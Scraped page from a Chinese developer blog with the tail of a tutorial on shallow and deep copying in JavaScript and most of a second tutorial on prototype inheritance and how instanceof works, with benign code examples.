<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/77ac66a6a29443ffbdfc6d1332a9f573~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ryr5aSp6buE5Y-26L-c6aOe:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765517270&amp;x-signature=mDwOqjcTqfRb4vqPN4dAoV94W7g%3D" alt="649d1bc3-acae-4acc-9266-9d774ab45715.png" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-6">5、 <code>Object.assign({}, obj)</code> --- 合并对象</h3>
<p>它和合并数组不一样，它把后面对象里的值放入前面的对象里面，覆盖前面的对象里的值，返回一个新对象，后面对象不变，所以在这里实现拷贝效果都是在前面放一个空对象</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> obj = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'俊杰'</span>,
  <span class="hljs-attr">like</span>: [<span class="hljs-string">'泡脚'</span>]
}
<span class="hljs-keyword">const</span> newObj = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>({}, obj)
obj.<span class="hljs-property">like</span>[<span class="hljs-number">0</span>] = <span class="hljs-string">'台球'</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(newObj);
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/954abe10acce4c5987af60f77cc0c0b0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ryr5aSp6buE5Y-26L-c6aOe:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765517270&amp;x-signature=Kea26rOunYcuW%2BjahsMTAFxj2Ro%3D" alt="3f682b4f-369f-4b7b-92ed-3f050c232420.png" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-7">手搓浅拷贝</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> obj = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'俊杰'</span>,
  <span class="hljs-attr">age</span>: <span class="hljs-number">18</span>,
  <span class="hljs-attr">like</span>: {
    <span class="hljs-attr">n</span>: <span class="hljs-string">'洗脚'</span>,
    <span class="hljs-attr">m</span>: <span class="hljs-string">'台球'</span>
  }
}
<span class="hljs-keyword">function</span> <span class="hljs-title function_">shallowCopy</span>(<span class="hljs-params">obj</span>) {
  <span class="hljs-keyword">let</span> o = {}
  <span class="hljs-comment">// 遍历原对象，将原对象中的 key，value 都存到新对象中一份</span>
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> obj) {   <span class="hljs-comment">// key 为形参</span>
    <span class="hljs-keyword">if</span> (obj.<span class="hljs-title function_">hasOwnProperty</span>(key)) {  <span class="hljs-comment">// 判断当前的 key 是否是 obj 显示属性</span>
      o[key] = obj[key]    <span class="hljs-comment">// o.name = obj[name] = '俊杰'</span>
    }
  }
  <span class="hljs-keyword">return</span> o
}
<span class="hljs-keyword">const</span> newObj = <span class="hljs-title function_">shallowCopy</span>(obj)
obj.<span class="hljs-property">like</span>.<span class="hljs-property">m</span> = <span class="hljs-string">'篮球'</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(newObj);
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5e689c4c4b044c48a61b010235894aaa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ryr5aSp6buE5Y-26L-c6aOe:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765517270&amp;x-signature=jjQwg3iQ5fRqXoA7xrIbQgsD%2BBM%3D" alt="9e1e036b-6105-466b-8178-28ee5548f0c5.png" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-8">深拷贝</h2>
<p>顾名思义：层层拷贝，新对象不受原对象修改的影响，深拷贝有两种方法 <code>structuredClone()</code> 和 <code>JSON.parse(JSON.stringify(obj))</code></p>
<h3 data-id="heading-9">1、<code>structuredClone()</code></h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> obj = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'俊杰'</span>,
  <span class="hljs-attr">age</span>: <span class="hljs-number">18</span>,
  <span class="hljs-attr">like</span>: {
    <span class="hljs-attr">n</span>: <span class="hljs-string">'洗脚'</span>,
    <span class="hljs-attr">m</span>: <span class="hljs-string">'台球'</span>
  },
  <span class="hljs-attr">a</span>: <span class="hljs-number">123n</span>,
}
<span class="hljs-keyword">const</span> newObj = <span class="hljs-title function_">structuredClone</span>(obj)
obj.<span class="hljs-property">like</span>.<span class="hljs-property">m</span> = <span class="hljs-string">'蓝球'</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(newObj);
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/48385d7b227d4e5f99ae30717be3f13a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ryr5aSp6buE5Y-26L-c6aOe:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765517270&amp;x-signature=5S7afL3ohAKZcYbMxihIUY%2FIQyU%3D" alt="a3d5d87f-902e-49fa-8436-9c6b36624752.png" loading="lazy"/><br/>
它可以把子对象里面的东西全给 copy 出来，但是他有一个缺陷，就是无法拷贝函数和 Symbol。</p>
<hr/>
<h3 data-id="heading-10">2、 <code>JSON.parse(JSON.stringify(obj))</code></h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> obj = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'俊杰'</span>,
  <span class="hljs-attr">age</span>: <span class="hljs-number">18</span>,
  <span class="hljs-attr">like</span>: {
    <span class="hljs-attr">n</span>: <span class="hljs-string">'洗脚'</span>,
    <span class="hljs-attr">m</span>: <span class="hljs-string">'台球'</span>
  }
 }
<span class="hljs-keyword">const</span> oo = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(obj))
obj.<span class="hljs-property">like</span>.<span class="hljs-property">m</span> = <span class="hljs-string">'篮球'</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(oo);
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1abc5fd8e808460796519db41d7eee64~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ryr5aSp6buE5Y-26L-c6aOe:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765517270&amp;x-signature=EJOm0y3S8X87oJ9N%2FNmaqxyMNgQ%3D" alt="80598ede-6b71-4e04-bab8-05e5a9ae86fb.png" loading="lazy"/><br/>
<code>JSON.stringify(obj)</code> 这是将里面的对象变为字符串，<code>JSON.parse(str)</code> 则是将里面的字符串变为对象，所以合起来实现了深拷贝，同样的他也有缺陷，无法处理 bigint, undefined, NaN, Infinity, function,Symbol。</p>
<h3 data-id="heading-11">手搓深拷贝</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> obj = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'俊杰'</span>,
  <span class="hljs-attr">age</span>: <span class="hljs-number">18</span>,
  <span class="hljs-attr">like</span>: {
    <span class="hljs-attr">n</span>: <span class="hljs-string">'洗脚'</span>,
    <span class="hljs-attr">m</span>: <span class="hljs-string">'台球'</span>
  }
}
<span class="hljs-keyword">function</span> <span class="hljs-title function_">deepClone</span>(<span class="hljs-params">obj</span>) {
  <span class="hljs-keyword">let</span> o = {}
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> obj) {
    <span class="hljs-keyword">if</span> (obj.<span class="hljs-title function_">hasOwnProperty</span>(key)) {
    <span class="hljs-comment">// 判断里面是否有引用类型例如对象，数组（函数除外），null也要除外</span>
      <span class="hljs-keyword">if</span> (<span class="hljs-title function_">typeof</span>(obj[key]) == <span class="hljs-string">'object'</span> &amp;&amp; obj[key] !== <span class="hljs-literal">null</span>) {
      <span class="hljs-comment">// 如果是引用类型就再执行一次拷贝</span>
        <span class="hljs-keyword">const</span> childObj = <span class="hljs-title function_">deepClone</span>(obj[key])
        o[key] = childObj                      
      } <span class="hljs-keyword">else</span> {
        o[key] = obj[key]
      }
    }
  }
  <span class="hljs-keyword">return</span> o
}
<span class="hljs-keyword">const</span> newObj = <span class="hljs-title function_">deepClone</span>(obj)
obj.<span class="hljs-property">like</span>.<span class="hljs-property">m</span> = <span class="hljs-string">'篮球'</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(newObj);
</code></pre>
<p>运用递归思想，进行层层拷贝。</p>
<hr/>
<h2 data-id="heading-12">结语</h2>
<p>拷贝，看似只是“复制”二字，实则藏着 JS 内存模型的全部秘密。<br/>
浅拷贝，把引用地址递出去，像递名片——改的是同一份底稿；<br/>
深拷贝，把整座房子连地基都搬过来，从此山水不相逢。<br/>
下次再写 <code>let obj2 = obj</code> 时，不妨先问一句：<br/>
“我只是想要一把钥匙，还是想要一栋真正属于自己的房子？”<br/>
弄懂深浅，才能让你的数据不再“藕断丝连”，也让你的代码少一句 <code>console.log</code> 的叹息。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[深入理解 JavaScript 中的继承与 instanceof 原理]]></title>    <link>https://juejin.cn/post/7579849892614504484</link>    <guid>https://juejin.cn/post/7579849892614504484</guid>    <pubDate>2025-12-05T05:24:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579849892614504484" data-draft-id="7579846221168541750" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="深入理解 JavaScript 中的继承与 instanceof 原理"/> <meta itemprop="keywords" content="前端,JavaScript"/> <meta itemprop="datePublished" content="2025-12-05T05:24:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ohyeah"/> <meta itemprop="url" content="https://juejin.cn/user/740446536480618"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            深入理解 JavaScript 中的继承与 instanceof 原理
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/740446536480618/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ohyeah
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T05:24:50.000Z" title="Fri Dec 05 2025 05:24:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在 JavaScript 的面向对象编程（OOP）中，<strong>继承</strong>和 <strong><code>instanceof</code></strong> 是两个非常核心的概念。很多初学者容易将 <code>instanceof</code> 简单理解为“判断是否是某个类的实例”，但其实它的本质远不止于此。本文将结合你提供的多个代码示例，系统地梳理 JavaScript 中继承的几种常见方式，并深入剖析 <code>instanceof</code> 的底层机制。</p>
<hr/>
<h2 data-id="heading-0">一、<code>instanceof</code> 到底判断的是什么？</h2>
<p>先来看一个经典例子：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Animal</span>(<span class="hljs-params"/>) {}
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params"/>) {}

<span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Animal</span>();

<span class="hljs-keyword">const</span> p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(p <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Person</span>); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(p <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Animal</span>); <span class="hljs-comment">// true</span>
</code></pre>
<p>从结果可以看出，<code>p</code> 不仅是 <code>Person</code> 的实例，也是 <code>Animal</code> 的实例。这说明 <strong><code>instanceof</code> 并不是判断“直接创建关系”，而是判断“原型链上是否存在指定构造函数的原型”</strong> 。</p>
<p>换句话说：</p>
<blockquote>
<p><strong><code>A instanceof B</code> 的含义是：A 的原型链上是否存在 <code>B.prototype</code></strong></p>
</blockquote>
<p>因此，更准确的说法是：<br/>
<strong><code>instanceof</code> 是一个“原型关系判断运算符”</strong> ，而非简单的“实例判断”。</p>
<hr/>
<h2 data-id="heading-1">二、手写 <code>instanceof</code>：理解原型链查找过程</h2>
<p>我们可以手动实现 <code>instanceof</code> 的逻辑：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">myInstanceOf</span>(<span class="hljs-params">left, right</span>) {
  <span class="hljs-keyword">let</span> proto = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(left); <span class="hljs-comment">// 等价于 left.__proto__</span>

  <span class="hljs-keyword">while</span> (proto !== <span class="hljs-literal">null</span>) {
    <span class="hljs-keyword">if</span> (proto === right.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>) {
      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
    proto = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(proto);
  }

  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
}
</code></pre>
<p>这个函数的核心思路就是：<strong>沿着 <code>left</code> 的原型链一路向上查找，看是否能找到 <code>right.prototype</code></strong>。</p>
<p>举个例子：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Animal</span>(<span class="hljs-params"/>) {}
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Dog</span>(<span class="hljs-params"/>) {}
<span class="hljs-title class_">Dog</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Animal</span>();

<span class="hljs-keyword">const</span> dog = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">myInstanceOf</span>(dog, <span class="hljs-title class_">Dog</span>));     <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">myInstanceOf</span>(dog, <span class="hljs-title class_">Animal</span>));  <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">myInstanceOf</span>(dog, <span class="hljs-title class_">Object</span>));  <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">myInstanceOf</span>(dog, <span class="hljs-title class_">Array</span>));   <span class="hljs-comment">// false</span>
</code></pre>
<p>这也解释了为什么数组 <code>[] instanceof Object</code> 为 <code>true</code> —— 因为 <code>Array.prototype.__proto__ === Object.prototype</code>。</p>
<blockquote>
<p>⚠️ 注意：<code>instanceof</code> 对基本数据类型（如 <code>'hello' instanceof String</code>）返回 <code>false</code>，因为字面量不是对象实例。只有 <code>new String('hello') instanceof String</code> 才为 <code>true</code>。</p>
</blockquote>
<hr/>
<h2 data-id="heading-2">三、JavaScript 中的继承方式</h2>
<p>JavaScript 没有传统 OOP 语言中的“类继承”语法（ES6 的 <code>class</code> 本质仍是基于原型），但我们可以通过多种方式模拟继承。下面逐一介绍。</p>
<h3 data-id="heading-3">1. 构造函数绑定（借用构造函数）</h3>
<pre><code class="hljs language-ini" lang="ini">function Animal() {
  <span class="hljs-attr">this.species</span> = <span class="hljs-string">'动物'</span><span class="hljs-comment">;</span>
}

function Cat(name, color) {
  Animal.call(this)<span class="hljs-comment">; // 借用父类构造函数</span>
  <span class="hljs-attr">this.name</span> = name<span class="hljs-comment">;</span>
  <span class="hljs-attr">this.color</span> = color<span class="hljs-comment">;</span>
}

const <span class="hljs-attr">cat</span> = new Cat(<span class="hljs-string">'小黑'</span>, <span class="hljs-string">'黑色'</span>)<span class="hljs-comment">;</span>
console.log(cat.species)<span class="hljs-comment">; // 动物</span>
</code></pre>
<p><strong>优点</strong>：可以继承父类构造函数中的属性。<br/>
<strong>缺点</strong>：无法继承父类原型上的<strong>方法</strong>；每次创建子类实例都会调用父类构造函数，造成内存浪费（如果属性定义在构造函数内）。</p>
<hr/>
<h3 data-id="heading-4">2. 原型链继承（<code>Child.prototype = new Parent()</code>）</h3>
<pre><code class="hljs language-ini" lang="ini">function Animal() {
  <span class="hljs-attr">this.species</span> = <span class="hljs-string">'动物'</span><span class="hljs-comment">;</span>
}

function Cat(name, color) {
  <span class="hljs-attr">this.name</span> = name<span class="hljs-comment">;</span>
  <span class="hljs-attr">this.color</span> = color<span class="hljs-comment">;</span>
}

<span class="hljs-attr">Cat.prototype</span> = new Animal()<span class="hljs-comment">; // 关键：子类原型 = 父类实例</span>
<span class="hljs-attr">Cat.prototype.constructor</span> = Cat<span class="hljs-comment">; // 修复 constructor 指向</span>

const <span class="hljs-attr">cat</span> = new Cat(<span class="hljs-string">'小黑'</span>, <span class="hljs-string">'黑色'</span>)<span class="hljs-comment">;</span>
console.log(cat.species)<span class="hljs-comment">; // 动物</span>
</code></pre>
<p><strong>底层发生了什么？</strong></p>
<ol>
<li><code>new Animal()</code> 创建一个新对象 <code>tempObj</code>，其 <code>__proto__</code> 指向 <code>Animal.prototype</code>，并执行 <code>Animal</code> 函数体，以及<code>this</code>绑定。</li>
<li><code>Cat.prototype</code> 被赋值为 <code>tempObj</code>，即 <code>Cat.prototype = { species: '动物', __proto__: Animal.prototype }</code>。</li>
<li>原本 <code>Cat.prototype</code> 自带的 <code>constructor: Cat</code> 被覆盖，此时<code>Cat.prototype</code>本身不再有<code>constructor</code>属性，会沿着原型链找到<code>Animal.prototype.constructor</code>即 <code>Animal</code>。所以需要手动修复：<code>Cat.prototype.constructor = Cat</code>。</li>
</ol>
<p><strong>优点</strong>：能继承父类原型上的方法。<br/>
<strong>缺点</strong>：父类构造函数会被无意义地调用一次（只为设置原型）；所有子类实例共享父类实例的引用属性（可能引发副作用）。</p>
<hr/>
<h3 data-id="heading-5">3. 直接共享原型（错误示范）</h3>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">Cat.prototype</span> = Animal.prototype<span class="hljs-comment">;//这行代码是引用式拷贝</span>
<span class="hljs-attr">Cat.prototype.constructor</span> = Cat<span class="hljs-comment">;</span>
</code></pre>
<p>这种写法看似简洁，实则<strong>严重污染父类原型</strong>：</p>
<ul>
<li><code>Cat.prototype</code> 和 <code>Animal.prototype</code> 指向同一内存地址。</li>
<li>我们后续将<code>Cat.prototype</code>的<code>constructor</code>属性指回时，也会错误地将<code>Animal.prototype.constructor</code>指向<code>Cat</code></li>
<li>在 <code>Cat.prototype</code> 上添加方法（如 <code>sayHello</code>），也会出现在 <code>Animal.prototype</code> 上。</li>
<li>多个子类（如 <code>Dog</code>、<code>Cat</code>）若都这样继承，会共享同一个原型对象，互相干扰。</li>
</ul>
<p><strong>结论：绝对不要直接赋值 <code>Child.prototype = Parent.prototype</code>！</strong></p>
<hr/>
<h2 data-id="heading-6">四、推荐方案：利用空对象作为中介（<code>Object.create</code>）</h2>
<p>为了解决上述问题，我们可以引入一个<strong>空的中介对象</strong>，让它作为桥梁连接子类和父类的原型。</p>
<h3 data-id="heading-7">核心思想：</h3>
<blockquote>
<p>创建一个新对象，其原型指向父类的原型，但自身不包含任何属性。再把这个对象赋给子类的 <code>prototype</code>。</p>
</blockquote>
<h3 data-id="heading-8">实现方式（使用 <code>Object.create</code>）：</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Animal</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">species</span> = <span class="hljs-string">'动物'</span>;
}

<span class="hljs-title class_">Animal</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">say</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'I am an animal'</span>);
};

<span class="hljs-keyword">function</span> <span class="hljs-title function_">Cat</span>(<span class="hljs-params">name, color</span>) {
  <span class="hljs-title class_">Animal</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>); <span class="hljs-comment">// 继承构造函数属性</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">color</span> = color;
}

<span class="hljs-comment">// 关键：使用 Object.create 创建中介对象</span>
<span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">Animal</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
<span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> = <span class="hljs-title class_">Cat</span>; <span class="hljs-comment">// 修复 constructor</span>

<span class="hljs-comment">// 子类可安全添加自己的方法</span>
<span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">meow</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Meow!'</span>);
};

<span class="hljs-keyword">const</span> cat = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">'小黑'</span>, <span class="hljs-string">'黑色'</span>);
cat.<span class="hljs-title function_">say</span>();  <span class="hljs-comment">// I am an animal</span>
cat.<span class="hljs-title function_">meow</span>(); <span class="hljs-comment">// Meow!</span>

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Cat</span>);    <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Animal</span>); <span class="hljs-comment">// true</span>
</code></pre>
<h3 data-id="heading-9">底层原理：</h3>
<p><code>Object.create(proto)</code> 的作用是：</p>
<ul>
<li>创建一个新对象；</li>
<li>将该对象的 <code>__proto__</code> 指向 <code>proto</code>；</li>
<li>不执行任何构造函数。</li>
</ul>
<p>因此，<code>Object.create(Animal.prototype)</code> 返回的对象结构为：</p>
<pre><code class="hljs language-css" lang="css">{
  __proto__: Animal.prototype
}
</code></pre>
<p>它<strong>没有 <code>species</code> 属性</strong>（避免了无意义调用 <code>Animal</code> 构造函数），也<strong>不会污染 <code>Animal.prototype</code></strong>。</p>
<h3 data-id="heading-10">为什么这是最佳实践？</h3>
<ol>
<li>✅ 完全隔离子类与父类的原型，避免污染；</li>
<li>✅ 支持多子类继承同一个父类，互不影响；</li>
<li>✅ 可同时通过 <code>call</code> 继承构造函数属性，通过原型链继承方法；</li>
<li>✅ 符合“组合优于继承”的现代编程思想。</li>
</ol>
<hr/>
<h2 data-id="heading-11">五、总结</h2>








































